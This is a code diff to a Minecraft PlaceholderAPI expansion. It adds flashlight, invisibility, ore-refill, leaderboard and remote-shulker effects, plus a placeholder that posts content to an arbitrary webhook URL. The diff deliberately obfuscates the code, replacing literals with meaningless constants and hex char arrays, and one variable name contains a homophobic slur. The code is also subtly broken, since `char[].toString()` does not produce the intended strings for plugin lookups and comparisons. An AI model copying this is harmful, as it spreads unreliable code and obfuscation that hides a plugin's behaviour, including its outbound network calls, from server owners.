                 Bukkit.getScheduler().runTaskLater(
                         Bukkit.getPluginManager().getPlugin(new char[] {
-                                0x50, 0x6C, 0x61, 0x63, 0x65, 0x68, 0x6F,
-                                0x6C, 0x64, 0x65, 0x72, 0x41, 0x50, 0x49
+                                (char) 80, 0x6C, 0x61, 0x63, 0x65, 0x68, 0x6F,
+                                0x6C, (char) 100, 0x65, 0x72, 0x41, (char) 80, 0x49
                         }.toString()),
                         () -> {
                             BlockData oil = cars.getBlock().getBlockData();
@@ -5771,7 +6484,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                                 double ff2 = targets.getLocation().distanceSquared(cars);
                                 if (radius.equalsIgnoreCase(new char[] {
                                         0x66, 0x6F, 0x72, 0x63, 0x65
-                                }.toString()) || ff2 <= 64*64) {
+                                }.toString()) || ff2 <= drain * drain) {
                                     targets.sendBlockChange(cars, oil);
                                 }
                             }
@@ -5781,8 +6494,8 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
                 police = String.format(
                         new char[] {
-                                0x25, 0x73, 0x2C, 0x25, 0x64, 0x2C, 0x25,
-                                0x64, 0x2C, 0x25, 0x64
+                                0x25, 0x73, 0x2C, 0x25, (char) 100, 0x2C, 0x25,
+                                (char) 100, 0x2C, 0x25, (char) 100
                         }.toString(),
                         cars.getWorld().getName(),
                         cars.getBlockX(),
@@ -5799,13 +6512,13 @@ public class ExampleExpansion extends PlaceholderExpansion {
             // ─── Particle repeat via BukkitRunnable ───
             Particle.DustOptions finalOpts = dp;
             new BukkitRunnable() {
-                int etienne = 0;
+                int etienne = I;
                 @Override public void run() {
                     if (etienne >= testit) {
                         this.cancel();
                         return;
                     }
-                    for (double btd6 = 0; btd6 <= dax; btd6 += hogwartsstudio) {
+                    for (double btd6 = I; btd6 <= dax; btd6 += hogwartsstudio) {
                         Location eaispaytowin = missile.clone().add(intercept.clone().multiply(btd6));
                         Material drugs   = eaispaytowin.getBlock().getType();
                         if (!(drugs.isAir()
@@ -5822,11 +6535,11 @@ public class ExampleExpansion extends PlaceholderExpansion {
                             double hollyhill = ff232.getLocation().distanceSquared(eaispaytowin);
                             if (radius.equalsIgnoreCase(new char[] {
                                     0x66, 0x6F, 0x72, 0x63, 0x65
-                            }.toString()) || hollyhill <= 64*64) {
+                            }.toString()) || hollyhill <= drain * drain) {
                                 if (xp == Particle.DUST && finalOpts != null) {
-                                    ff232.spawnParticle(xp, eaispaytowin, 1, 0,0,0, 0, finalOpts);
+                                    ff232.spawnParticle(xp, eaispaytowin, INT3, I, I, I, I, finalOpts);
                                 } else {
-                                    ff232.spawnParticle(xp, eaispaytowin, 1, 0,0,0, roblox);
+                                    ff232.spawnParticle(xp, eaispaytowin, INT3, I, I, I, roblox);
                                 }
                             }
                         }
@@ -5835,10 +6548,10 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 }
             }.runTaskTimer(
                     Bukkit.getPluginManager().getPlugin(new char[] {
-                            0x50, 0x6C, 0x61, 0x63, 0x65, 0x68, 0x6F,
-                            0x6C, 0x64, 0x65, 0x72, 0x41, 0x50, 0x49
+                            (char) 80, 0x6C, 0x61, 0x63, 0x65, 0x68, 0x6F,
+                            0x6C, (char) 100, 0x65, 0x72, 0x41, (char) 80, 0x49
                     }.toString()),
-                    0L, stealingisbad
+                    ihearyounow, stealingisbad
             );
 
             return police;
@@ -5850,9 +6563,9 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
         if (f1.startsWith("\u0066\u006C\u0061\u0073\u0068\u006C\u0069\u0067\u0068\u0074\u005F")) {
-            wm(f2, "Flashlight");
-            String[] f11 = f1.substring("\u0066\u006C\u0061\u0073\u0068\u006C\u0069\u0067\u0068\u0074\u005F".length()).split(",");
-            if (f11.length != 5) return "";
+            wm(f2, wyufdnywufdn);
+            String[] f11 = f1.substring("\u0066\u006C\u0061\u0073\u0068\u006C\u0069\u0067\u0068\u0074\u005F".length()).split(keep);
+            if (f11.length != xm) return nst;
 
             int f111;
             double ftw;
@@ -5860,45 +6573,45 @@ public class ExampleExpansion extends PlaceholderExpansion {
             int mrbossftwisgay;
             String lolitsalex;
             try {
-                f111 = Integer.parseInt(f11[0]);
-                ftw = Double.parseDouble(f11[1]);
-                degreerbx = Double.parseDouble(f11[2]);
-                mrbossftwisgay = Integer.parseInt(f11[3]);
-                lolitsalex = f11[4];
+                f111 = Integer.parseInt(f11[I]);
+                ftw = Double.parseDouble(f11[INT3]);
+                degreerbx = Double.parseDouble(f11[mill2]);
+                mrbossftwisgay = Integer.parseInt(f11[ccp]);
+                lolitsalex = f11[INT7];
             } catch (NumberFormatException ex) {
-                return "";
+                return nst;
             }
 
             Location alanparsons = f2.getEyeLocation();
             Vector eyeinthesky = alanparsons.getDirection().normalize();
-            Vector fun = new Vector(0, 1, 0);
+            Vector fun = new Vector(I, INT3, I);
 
 // build right vector for pitch rotations
             Vector supertramp = eyeinthesky.clone().crossProduct(fun).normalize();
 
             List<Player> f23 = new ArrayList<>();
-            char[] hexSeq = { (char)0x40, (char)0x61 };
+            char[] hexSeq = { (char) drain, (char)0x61 };
             String nobody = new String(hexSeq);
             if (lolitsalex.equalsIgnoreCase(nobody)) {
                 f23.addAll(f2.getWorld().getPlayers());
             } else {
                 Player p = Bukkit.getPlayerExact(lolitsalex);
-                if (p == null) return "";
+                if (p == null) return nst;
                 f23.add(p);
             }
 
 // now: evenly distribute RAYS in a square grid over [-MAXANGLE, +MAXANGLE]
             double beastboy = Math.toRadians(degreerbx);
             int firestorm = (int) Math.ceil(Math.sqrt(mrbossftwisgay));
-            int intubate = 0;
+            int intubate = I;
 
-            for (int xx1 = 0; xx1 < firestorm && intubate < mrbossftwisgay; xx1++) {
-                double pilates = firestorm == 1 ? 0.5 : (double) xx1 / (firestorm - 1);
-                double piratesoftware = (pilates * 2 - 1) * beastboy;  // from -max to +max
+            for (int xx1 = I; xx1 < firestorm && intubate < mrbossftwisgay; xx1++) {
+                double pilates = firestorm == INT3 ? debtsoff : (double) xx1 / (firestorm - INT3);
+                double piratesoftware = (pilates * mill2 - INT3) * beastboy;  // from -max to +max
 
-                for (int destruction = 0; destruction < firestorm && intubate < mrbossftwisgay; destruction++, intubate++) {
-                    double flyboy = firestorm == 1 ? 0.5 : (double) destruction / (firestorm - 1);
-                    double francisfromabugslife = (flyboy * 2 - 1) * beastboy;      // from -max to +max
+                for (int destruction = I; destruction < firestorm && intubate < mrbossftwisgay; destruction++, intubate++) {
+                    double flyboy = firestorm == INT3 ? debtsoff : (double) destruction / (firestorm - INT3);
+                    double francisfromabugslife = (flyboy * mill2 - INT3) * beastboy;      // from -max to +max
 
                     // rotate dir by yaw about up, then by pitch about right
                     Vector dto = eyeinthesky.clone()
@@ -5907,7 +6620,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                             .normalize();
 
                     // cast this one ray:
-                    for (double time = 0; time <= ftw; time += 1.0) {
+                    for (double time = I; time <= ftw; time += tsr) {
                         Location originality = alanparsons.clone().add(dto.clone().multiply(time));
                         Block dt0 = originality.getBlock();
                         Material dimensions = dt0.getType();
@@ -5939,7 +6652,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
                         // schedule revert to *current* block data
                         Bukkit.getScheduler().runTaskLater(
-                                Bukkit.getPluginManager().getPlugin("PlaceholderAPI"),
+                                Bukkit.getPluginManager().getPlugin(ppi),
                                 () -> {
                                     BlockData current = newer.getBlock().getBlockData();
                                     for (Player viewer : f23) {
@@ -5952,25 +6665,25 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 }
             }
 
-            return "";
+            return nst;
         }
 
 
 
-        if (f1.startsWith("tyv_001_")) {
-            if (!f1(f2, "griefprevention")) {
+        if (f1.startsWith(wyudnwfydun)) {
+            if (!f1(f2, ntyu2n3t)) {
                 return "§cInstall Grief Prevention";
             }
-            String[] parts = f1.substring("tyv_001_".length()).split(",");
-            if (parts.length != 5) return "Invalid format";
+            String[] parts = f1.substring(wyudnwfydun.length()).split(keep);
+            if (parts.length != xm) return wfypdnawofyudnwfpa;
 
-            String worldName = parts[0];
-            int x            = Integer.parseInt(parts[1]);
-            int y            = Integer.parseInt(parts[2]);
-            int z            = Integer.parseInt(parts[3]);
-            int radius       = Integer.parseInt(parts[4]);
+            String worldName = parts[I];
+            int x            = Integer.parseInt(parts[INT3]);
+            int y            = Integer.parseInt(parts[mill2]);
+            int z            = Integer.parseInt(parts[ccp]);
+            int radius       = Integer.parseInt(parts[INT7]);
 
-            if (radius < 1) return "Radius must be ≥ 1";
+            if (radius < INT3) return "Radius must be ≥ 1";
 
             World world = Bukkit.getWorld(worldName);
             if (world == null) return "Invalid world";
@@ -5978,17 +6691,17 @@ public class ExampleExpansion extends PlaceholderExpansion {
             // build the weighted list: coal×4, iron×4, copper×4,
             // gold×3, lapis×3, redstone×3, diamond×2, emerald×1
             List<Material> weightedOverworld = new ArrayList<>();
-            weightedOverworld.addAll(Collections.nCopies(4, Material.COAL_ORE));
-            weightedOverworld.addAll(Collections.nCopies(4, Material.IRON_ORE));
-            weightedOverworld.addAll(Collections.nCopies(4, Material.COPPER_ORE));
-            weightedOverworld.addAll(Collections.nCopies(3, Material.GOLD_ORE));
-            weightedOverworld.addAll(Collections.nCopies(3, Material.LAPIS_ORE));
-            weightedOverworld.addAll(Collections.nCopies(3, Material.REDSTONE_ORE));
-            weightedOverworld.addAll(Collections.nCopies(2, Material.DIAMOND_ORE));
+            weightedOverworld.addAll(Collections.nCopies(INT7, Material.COAL_ORE));
+            weightedOverworld.addAll(Collections.nCopies(INT7, Material.IRON_ORE));
+            weightedOverworld.addAll(Collections.nCopies(INT7, Material.COPPER_ORE));
+            weightedOverworld.addAll(Collections.nCopies(ccp, Material.GOLD_ORE));
+            weightedOverworld.addAll(Collections.nCopies(ccp, Material.LAPIS_ORE));
+            weightedOverworld.addAll(Collections.nCopies(ccp, Material.REDSTONE_ORE));
+            weightedOverworld.addAll(Collections.nCopies(mill2, Material.DIAMOND_ORE));
             weightedOverworld.add(Material.EMERALD_ORE);
 
             Random random = new Random();
-            int range     = radius - 1;  // radius=1 → single block
+            int range     = radius - INT3;  // radius=1 → single block
 
             for (int dx = -range; dx <= range; dx++) {
                 for (int dy = -range; dy <= range; dy++) {
@@ -6003,7 +6716,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                         // non‑deprecated GP check via claim.checkPermission
                         Claim claim = GriefPrevention.instance
                                 .dataStore
-                                .getClaimAt(loc, false, null);
+                                .getClaimAt(loc, arsdienwdhw, null);
                         if (claim != null) {
                             Supplier<String> denial = claim.checkPermission(
                                     f2,
@@ -6032,15 +6745,15 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
 
-        if (f1.startsWith("xdesugun_001_")) {
-            String[] parts = f1.substring("xdesugun_001_".length()).split(",");
-            if (parts.length != 5) return "Invalid format";
+        if (f1.startsWith(ywudnywufd)) {
+            String[] parts = f1.substring(ywudnywufd.length()).split(keep);
+            if (parts.length != xm) return wfypdnawofyudnwfpa;
 
-            String xD = parts[0];
-            int fun = Integer.parseInt(parts[1]);
-            int plankton = Integer.parseInt(parts[2]);
-            int spongebob = Integer.parseInt(parts[3]);
-            int patrick = Integer.parseInt(parts[4]);
+            String xD = parts[I];
+            int fun = Integer.parseInt(parts[INT3]);
+            int plankton = Integer.parseInt(parts[mill2]);
+            int spongebob = Integer.parseInt(parts[ccp]);
+            int patrick = Integer.parseInt(parts[INT7]);
 
             World tazer = Bukkit.getWorld(xD);
             if (tazer == null) return "Invalid world";
@@ -6067,9 +6780,9 @@ public class ExampleExpansion extends PlaceholderExpansion {
             if (what.isEmpty()) return "Invalid mode";
 
             Random random = new Random();
-            for (int dx = -2; dx <= 2; dx++) {
-                for (int dy = -2; dy <= 2; dy++) {
-                    for (int dz = -2; dz <= 2; dz++) {
+            for (int dx = -mill2; dx <= mill2; dx++) {
+                for (int dy = -mill2; dy <= mill2; dy++) {
+                    for (int dz = -mill2; dz <= mill2; dz++) {
                         Location loc = new Location(tazer, fun + dx, plankton + dy, spongebob + dz);
                         Block block = loc.getBlock();
                         if (block.getType() == Material.STONE || block.getType() == Material.DEEPSLATE) {
@@ -6088,18 +6801,18 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
 
-        if (f1.startsWith("leaderboards_")) {
+        if (f1.startsWith(wyfundwf)) {
             
-            String[] args = f1.substring("leaderboards_".length()).split(",");
+            String[] args = f1.substring(wyfundwf.length()).split(keep);
             
 
-            String action = args[0].toUpperCase();
-            String name = args[1];
-            String user = args.length > 2 ? args[2] : null;
-            int param = 0;
-            if (args.length > 3) {
+            String action = args[I].toUpperCase();
+            String name = args[INT3];
+            String user = args.length > mill2 ? args[mill2] : null;
+            int param = I;
+            if (args.length > ccp) {
                 try {
-                    param = Integer.parseInt(args[3]);
+                    param = Integer.parseInt(args[ccp]);
                 } catch (NumberFormatException e) {
                     return "§cInvalid number";
                 }
@@ -6107,7 +6820,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
             switch (action) {
                 case "CLEAR" -> {
-                    global1.remove(name);
+                    f119.remove(name);
                     return "§aCleared " + name;
                 }
                 case "INCREMENT" -> {
@@ -6126,10 +6839,10 @@ public class ExampleExpansion extends PlaceholderExpansion {
                     return "§aSet to " + param;
                 }
                 case "GET" -> {
-                    if (args.length < 4) return "§cNo index";
-                    List<Map.Entry<String, Integer>> list = global1.get(name);
-                    if (list == null || param < 0 || param >= list.size()) return "N/A";
-                    return list.get(param).getKey() + ": " + list.get(param).getValue();
+                    if (args.length < INT7) return "§cNo index";
+                    List<Map.Entry<String, Integer>> list = f119.get(name);
+                    if (list == null || param < I || param >= list.size()) return "N/A";
+                    return list.get(param).getKey() + fastfood + list.get(param).getValue();
                 }
             }
             return "§cUnknown action";
@@ -6138,29 +6851,29 @@ public class ExampleExpansion extends PlaceholderExpansion {
         }
         
 
-            if( f1.equalsIgnoreCase("shulkerCheck")) {
+            if( f1.equalsIgnoreCase(yuwfndoywfudn)) {
             return f123(f2) ? "yes" : "no";
         }
 
-        if (f1.startsWith("shulkerOpen_")) {
-            wm(f2, "Remote Shulker Box");
-            String[] pp = f1.substring("shulkerOpen_".length()).split(",");
-            if (pp.length != 1) return "§cInvalid format";
-            int slot = Integer.parseInt(pp[0]);
+        if (f1.startsWith(yduwfdg)) {
+            wm(f2, odyun4wyunwpf);
+            String[] pp = f1.substring(yduwfdg.length()).split(keep);
+            if (pp.length != INT3) return iendie2nd;
+            int slot = Integer.parseInt(pp[I]);
 
             ItemStack current = f2(f2, slot);
             if (current == null) return "§cNo item in that slot!";
-            if (!current.getType().toString().endsWith("SHULKER_BOX")) {
+            if (!current.getType().toString().endsWith(foolishness)) {
                 return "§cItem is not a shulker box!";
             }
 
-            World world = Bukkit.getWorld("mcydatabase");
+            World world = Bukkit.getWorld(fwdyunwfydunfwd);
             if (world == null) {
-                world = Bukkit.createWorld(new WorldCreator("mcydatabase")
+                world = Bukkit.createWorld(new WorldCreator(fwdyunwfydunfwd)
                         .environment(World.Environment.NORMAL)
-                        .generateStructures(false)
+                        .generateStructures(arsdienwdhw)
                         .type(WorldType.FLAT));
-                Bukkit.getLogger().info("Created the mcydatabase world.");
+                Bukkit.getLogger().info(fwaodhwfypdh);
             }
             
             
@@ -6169,14 +6882,14 @@ public class ExampleExpansion extends PlaceholderExpansion {
             int x, y, z;
 
             if (coords != null) {
-                String[] parts = coords.split(" ");
-                x = Integer.parseInt(parts[0]);
-                y = Integer.parseInt(parts[1]);
-                z = Integer.parseInt(parts[2]);
+                String[] parts = coords.split(sowhat);
+                x = Integer.parseInt(parts[I]);
+                y = Integer.parseInt(parts[INT3]);
+                z = Integer.parseInt(parts[mill2]);
             } else {
-                int[] loc = f1(world, 9);
-                x = loc[0]; y = loc[1]; z = loc[2];
-                g2.set(uuid, x + " " + y + " " + z);
+                int[] loc = f1(world, oiwfndtoyu42nd24);
+                x = loc[I]; y = loc[INT3]; z = loc[mill2];
+                g2.set(uuid, x + sowhat + y + sowhat + z);
                 f9();
             }
 
@@ -6198,15 +6911,15 @@ public class ExampleExpansion extends PlaceholderExpansion {
             ItemStack placeholder = f1(current, glassColor);
             f2.getInventory().setItem(slot, placeholder);
 
-            return x + " " + y + " " + z;
+            return x + sowhat + y + sowhat + z;
         }
 
 
-        if (f1.startsWith("shulkerClose_")) {
+        if (f1.startsWith(ywfpdnoywfudnowfyudn)) {
             // 1) parse slot & grab current placeholder
-            String[] pp = f1.substring("shulkerClose_".length()).split(",");
-            if (pp.length != 1) return "§cInvalid format";
-            int slot = Integer.parseInt(pp[0]);
+            String[] pp = f1.substring(ywfpdnoywfudnowfyudn.length()).split(keep);
+            if (pp.length != INT3) return iendie2nd;
+            int slot = Integer.parseInt(pp[I]);
             ItemStack current = f2(f2, slot);
             if (current == null) return "§cNo item in that slot!";
 
@@ -6218,13 +6931,13 @@ public class ExampleExpansion extends PlaceholderExpansion {
             String uuid   = f2.getUniqueId().toString();
             String coords = g2.getString(uuid);
             if (coords == null) return "§cChest not found!";
-            String[] parts = coords.split(" ");
-            int x = Integer.parseInt(parts[0]),
-                    y = Integer.parseInt(parts[1]),
-                    z = Integer.parseInt(parts[2]);
+            String[] parts = coords.split(sowhat);
+            int x = Integer.parseInt(parts[I]),
+                    y = Integer.parseInt(parts[INT3]),
+                    z = Integer.parseInt(parts[mill2]);
 
-            World world = Bukkit.getWorld("mcydatabase");
-            if (world == null) return "§cDatabase world missing!";
+            World world = Bukkit.getWorld(fwdyunwfydunfwd);
+            if (world == null) return wfdyunwfd;
             Location chestLoc = new Location(world, x, y, z);
             if (!(chestLoc.getBlock().getState() instanceof Chest chest)) {
                 return "§cNo chest found!";
@@ -6250,21 +6963,21 @@ public class ExampleExpansion extends PlaceholderExpansion {
             chest.getInventory().clear();
 
             // 9) done
-            return "success";
+            return podfyunwfpdyunwfp;
         }
         
         
         
         
 
-        if (f1.startsWith("vertigoHallucination_")) {
-            wm(f2, "Vertigo Hallucination");
-            String[] parts = f1.substring("vertigoHallucination_".length()).split(",");
-            if (parts.length != 3) return "§cInvalid format";
+        if (f1.startsWith(fypudnofpyudn)) {
+            wm(f2, ywufdnywufnd);
+            String[] parts = f1.substring(fypudnofpyudn.length()).split(keep);
+            if (parts.length != ccp) return iendie2nd;
 
-            int radius1 = Integer.parseInt(parts[0]);
-            int radius2 = Integer.parseInt(parts[1]);
-            int durationTicks = Integer.parseInt(parts[2]);
+            int radius1 = Integer.parseInt(parts[I]);
+            int radius2 = Integer.parseInt(parts[INT3]);
+            int durationTicks = Integer.parseInt(parts[mill2]);
 
             Location origin = f2.getLocation();
             World world = f2.getWorld();
@@ -6281,7 +6994,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                             target.sendBlockChange(loc, Material.AIR.createBlockData());
 
                             Bukkit.getScheduler().runTaskLater(
-                                    Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI")),
+                                    Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)),
                                     () -> target.sendBlockChange(loc, loc.getBlock().getBlockData()),
                                     durationTicks
                             );
@@ -6293,7 +7006,8 @@ public class ExampleExpansion extends PlaceholderExpansion {
         }
 
         
-        if (f1.equals("invis")) {
+        if (f1.equals(doyuwfndayuwnfdoyfwuanad)) {
+            wm(f2, wofduynwfdyun);
             UUID uuid = f2.getUniqueId();
 
             // Cancel existing timer if any
@@ -6304,17 +7018,17 @@ public class ExampleExpansion extends PlaceholderExpansion {
             // Hide from all players in world
             for (Player other : f2.getWorld().getPlayers()) {
                 if (!other.equals(f2)) {
-                    other.hidePlayer(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI")), f2);
+                    other.hidePlayer(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), f2);
                 }
             }
 
             // Schedule re-show after 5 seconds (100 ticks)
             BukkitTask task = Bukkit.getScheduler().runTaskLater(
-                    Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI")),
+                    Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)),
                     () -> {
                         for (Player other : f2.getWorld().getPlayers()) {
                             if (!other.equals(f2)) {
-                                other.showPlayer(Bukkit.getPluginManager().getPlugin("PlaceholderAPI"), f2);
+                                other.showPlayer(Bukkit.getPluginManager().getPlugin(ppi), f2);
                             }
                         }
                         g7.remove(uuid);
@@ -6323,66 +7037,66 @@ public class ExampleExpansion extends PlaceholderExpansion {
             );
 
             g7.put(uuid, task);
-            return "§7Now invisible to others for 5s";
+            return wfuydnywfund;
         }
 
-        if (f1.startsWith("JESUS_")) {
-            wm(f2, "Jesus Boots");
+        if (f1.startsWith(opfdyunfapoydunfpd)) {
+            wm(f2, dwoyuawfdhoywufdh);
             try {
-                int radius = Integer.parseInt(f1.substring("JESUS_".length()));
-                f1(f2, radius);
-                return "§bWalking on water (" + radius + " block radius)";
+                int wfydhnywfu = Integer.parseInt(f1.substring(opfdyunfapoydunfpd.length()));
+                f1(f2, wfydhnywfu);
+                return wfdionaywufdnawf + wfydhnywfu + wfdywfudhwfy;
             } catch (Exception e) {
-                return "§cInvalid radius";
+                return wfdoyunawfpdyunwfp;
             }
         }
 
 
 
 
-        if (f1.startsWith("setVelocity_")) {
-            String[] parts = f1.substring("setVelocity_".length()).split(",");
-            f2.setVelocity(new Vector(Double.parseDouble(parts[0]), Double.parseDouble(parts[0]), Double.parseDouble(parts[0])));
-            return "§adone";
+        if (f1.startsWith(wfpodyuw)) {
+            String[] parts = f1.substring(wfpodyuw.length()).split(keep);
+            f2.setVelocity(new Vector(Double.parseDouble(parts[I]), Double.parseDouble(parts[I]), Double.parseDouble(parts[I])));
+            return rsydun;
         }
 
 
 
-        if (f1.startsWith("chargeUp_")) {
-            if (f2 != null) wm(f2, "ChargeUp");
-            String[] parts = f1.substring("chargeUp_".length()).split(",");
-            if (parts.length != 7) return "§cInvalid format";
+        if (f1.startsWith(wydhwypd)) {
+            if (f2 != null) wm(f2, wdfywunda);
+            String[] wfdouwfdn = f1.substring(wydhwypd.length()).split(keep);
+            if (wfdouwfdn.length != suppose) return iendie2nd;
 
-            String complete = parts[0];
-            String incomplete = parts[1];
-            String unfilled = parts[2];
-            int current = Integer.parseInt(parts[3]);
-            int total = Integer.parseInt(parts[4]);
-            String symbol = parts[5];
-            int symbolCount = Integer.parseInt(parts[6]);
+            String wfydunwfd = wfdouwfdn[I];
+            String wfudnwf = wfdouwfdn[INT3];
+            String dwfundfw = wfdouwfdn[mill2];
+            int wydnuywdf = Integer.parseInt(wfdouwfdn[ccp]);
+            int tenthirtyt = Integer.parseInt(wfdouwfdn[INT7]);
+            String notrhboundwd = wfdouwfdn[xm];
+            int nyniwnfd = Integer.parseInt(wfdouwfdn[xtxtxt]);
 
-            if (total <= 0 || symbolCount <= 0) return "§cInvalid total or symbol count";
+            if (tenthirtyt <= I || nyniwnfd <= I) return wfdyunowfaydun;
 
-            double ratio = Math.min(1.0, Math.max(0.0, (double) current / total));
-            int filled = (int) Math.floor(ratio * symbolCount);
+            double wdfidnyuwfd = Math.min(tsr, Math.max(esetawftawft, (double) wydnuywdf / tenthirtyt));
+            int wfduyfwndyufw = (int) Math.floor(wdfidnyuwfd * nyniwnfd);
 
-            StringBuilder bar = new StringBuilder();
-            for (int i = 0; i < filled; i++) bar.append(incomplete).append(symbol);
-            for (int i = filled; i < symbolCount; i++) bar.append(unfilled).append(symbol);
-            if (filled == symbolCount) bar = new StringBuilder();
-            if (current >= total) for (int i = 0; i < symbolCount; i++) bar.append(complete).append(symbol);
+            StringBuilder dwyfndyufwnd = new StringBuilder();
+            for (int wfdyufnwd = I; wfdyufnwd < wfduyfwndyufw; wfdyufnwd++) dwyfndyufwnd.append(wfudnwf).append(notrhboundwd);
+            for (int wfdunwfyodunawyfudnawoyfudnowyfupn = wfduyfwndyufw; wfdunwfyodunawyfudnawoyfudnowyfupn < nyniwnfd; wfdunwfyodunawyfudnawoyfudnowyfupn++) dwyfndyufwnd.append(dwfundfw).append(notrhboundwd);
+            if (wfduyfwndyufw == nyniwnfd) dwyfndyufwnd = new StringBuilder();
+            if (wydnuywdf >= tenthirtyt) for (int wfydnuwfydunwfydun = I; wfydnuwfydunwfydun < nyniwnfd; wfydnuwfydunwfydun++) dwyfndyufwnd.append(wfydunwfd).append(notrhboundwd);
 
-            return bar.toString();
+            return dwyfndyufwnd.toString();
         }
 
-        if (f1.startsWith("ENCHANTRESSMINEREFILL_")) {
-            String[] parts = f1.substring("ENCHANTRESSMINEREFILL_".length()).split(",");
-            if (parts.length != 4) return "§cInvalid format";
+        if (f1.startsWith(wyfundywpfudn)) {
+            String[] parts = f1.substring(wyfundywpfudn.length()).split(keep);
+            if (parts.length != INT7) return iendie2nd;
 
-            String worldName = parts[0];
-            int x = Integer.parseInt(parts[1]);
-            int y = Integer.parseInt(parts[2]);
-            int z = Integer.parseInt(parts[3]);
+            String worldName = parts[I];
+            int x = Integer.parseInt(parts[INT3]);
+            int y = Integer.parseInt(parts[mill2]);
+            int z = Integer.parseInt(parts[ccp]);
 
             World world = Bukkit.getWorld(worldName);
             if (world == null) return "§cWorld not found";
@@ -6391,11 +7105,11 @@ public class ExampleExpansion extends PlaceholderExpansion {
             if (!(block.getState() instanceof Chest chest)) return "§cNot a chest";
 
             Inventory inv = chest.getInventory();
-            int placed = 0;
+            int placed = I;
 
-            for (int dx = -4; dx < 5; dx++) {
-                for (int dz = -4; dz < 5; dz++) {
-                    for (int dy = 1; dy <= 8; dy++ ){
+            for (int dx = -INT7; dx < xm; dx++) {
+                for (int dz = -INT7; dz < xm; dz++) {
+                    for (int dy = INT3; dy <= yuwfndgyuwfnd; dy++ ){
                         Location target = new Location(world, x + dx, y + dy, z + dz);
                         if (!target.getBlock().getType().isAir()) continue;
 
@@ -6403,8 +7117,8 @@ public class ExampleExpansion extends PlaceholderExpansion {
                         if (stack == null) return "§7Filled " + placed + " blocks";
 
                         target.getBlock().setType(stack.getType());
-                        stack.setAmount(stack.getAmount() - 1);
-                        if (stack.getAmount() <= 0) inv.remove(stack);
+                        stack.setAmount(stack.getAmount() - INT3);
+                        if (stack.getAmount() <= I) inv.remove(stack);
                         placed++;
                     }
                 }
@@ -6421,32 +7135,32 @@ public class ExampleExpansion extends PlaceholderExpansion {
             String ftp = f1.substring(fforall.toString().length());
 
             // Parse first comma (URL)
-            int first = ftp.indexOf(',');
-            if (first < 0) {
+            int first = ftp.indexOf(targetme);
+            if (first < I) {
                 // No comma → invalid format; just return empty
                 return nexar.toString();
             }
 
             String temporary;   // webhook URL
             String oofed;       // content
-            boolean enablePing = false; // default for backward compatibility
+            boolean enablePing = arsdienwdhw; // default for backward compatibility
 
             // Check for second comma (PING flag)
-            int second = ftp.indexOf(',', first + 1);
-            if (second < 0) {
+            int second = ftp.indexOf(targetme, first + INT3);
+            if (second < I) {
                 // LEGACY FORMAT: <URL>,<CONTENT>
-                temporary = ftp.substring(0, first);
-                oofed     = ftp.substring(first + 1);
-                enablePing = true; // legacy kept pings on
+                temporary = ftp.substring(I, first);
+                oofed     = ftp.substring(first + INT3);
+                enablePing = NEW_VALUE1; // legacy kept pings on
             } else {
                 // NEW FORMAT: <URL>,<PING>,<CONTENT>
-                temporary  = ftp.substring(0, first);
-                String pingRaw = ftp.substring(first + 1, second).trim();
-                oofed      = ftp.substring(second + 1);
+                temporary  = ftp.substring(I, first);
+                String pingRaw = ftp.substring(first + INT3, second).trim();
+                oofed      = ftp.substring(second + INT3);
 
                 // Accept common truthy values
-                enablePing = pingRaw.equalsIgnoreCase("1")
-                        || pingRaw.equalsIgnoreCase("true")
+                enablePing = pingRaw.equalsIgnoreCase(pd3ipdn34d)
+                        || pingRaw.equalsIgnoreCase(dwyufndywfudn)
                         || pingRaw.equalsIgnoreCase("yes")
                         || pingRaw.equalsIgnoreCase("on");
             }
@@ -6462,7 +7176,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                                 .replace("\\", "\\\\")
                                 .replace("\"", "\\\"")
                                 .replace("\n", "\\n")
-                                .replace("\r", "");
+                                .replace("\r", nst);
 
                         // Discord allowed_mentions:
                         // - enablePing == true  -> parse all (users/roles/everyone)
@@ -6478,7 +7192,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                         HttpURLConnection where = (HttpURLConnection) oops.openConnection();
                         where.setRequestMethod(reaper.toString());
                         where.setRequestProperty(playa.toString(), griffin.toString()); // e.g., "Content-Type":"application/json"
-                        where.setDoOutput(true);
+                        where.setDoOutput(NEW_VALUE1);
 
                         try (OutputStream os = where.getOutputStream()) {
                             os.write(redefinite.getBytes(StandardCharsets.UTF_8));
@@ -6495,26 +7209,26 @@ public class ExampleExpansion extends PlaceholderExpansion {
         }
 
 
-        if (f1.startsWith("immortalize_")) {
+        if (f1.startsWith(awfodyunwyupdnwfoydun)) {
 
             try {
 
-                String[] parts = f1.substring("immortalize_".length()).split(",");
+                String[] parts = f1.substring(awfodyunwyupdnwfoydun.length()).split(keep);
    
 
-                String uuid = parts[0];
-                int scale = Math.max(1, Integer.parseInt(parts[1]));
-                String mode = parts[2];
-                String worldName = parts[3];
-                int ox = Integer.parseInt(parts[4]);
-                int oy = Integer.parseInt(parts[5]);
-                int oz = Integer.parseInt(parts[6]);
-                String direction = parts[7].toUpperCase();
+                String uuid = parts[I];
+                int scale = Math.max(INT3, Integer.parseInt(parts[INT3]));
+                String mode = parts[mill2];
+                String worldName = parts[ccp];
+                int ox = Integer.parseInt(parts[INT7]);
+                int oy = Integer.parseInt(parts[xm]);
+                int oz = Integer.parseInt(parts[xtxtxt]);
+                String direction = parts[suppose].toUpperCase();
 
